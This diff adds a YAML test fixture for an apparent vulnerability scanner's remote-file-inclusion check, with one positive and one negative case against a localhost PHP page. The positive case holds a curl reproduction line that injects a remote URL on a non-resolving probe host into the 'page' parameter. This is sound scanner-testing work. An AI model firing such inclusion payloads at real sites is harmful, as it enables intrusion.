@@ -1,0 +1,35 @@
+# G.1/组 D fixture：远程文件包含（RFI，check 型）正反例。
+# 引擎判定：攻击响应出现 PHP 打开远程流失败签名（如 failed to open stream）
+# 且与基线 diff 显著 —— 证明 allow_url_include 生效。
+module: vulnclaw.engines.web_engines
+class: RFIEngine
+engine: rfi
+
+cases:
+  - id: rfi_remote_stream_error
+    method: check
+    expect: positive
+    url: http://127.0.0.1:8080/index.php?page=local
+    param: page
+    parsed_query: "page=local"
+    normal_resp: [200, "welcome home page", {}]
+    responses:
+      /index.php:
+        status: 500
+        body: "Warning: include(): failed to open stream: http request failed! in /var/www/index.php"
+    evidence_contains: "failed to open stream"
+    reproduction: "curl --get 'http://127.0.0.1:8080/index.php' --data-urlencode 'page=http://rfi-probe-nonexistent-7f3a.invalid/x.php'"
+
+  - id: rfi_benign_page
+    method: check
+    expect: negative
+    url: http://127.0.0.1:8080/index.php?page=local
+    param: page
+    parsed_query: "page=local"
+    normal_resp: [200, "welcome home page", {}]
+    responses:
+      /index.php:
+        status: 200
+        body: "welcome home page"
+    evidence_contains: ""
+    reproduction: ""
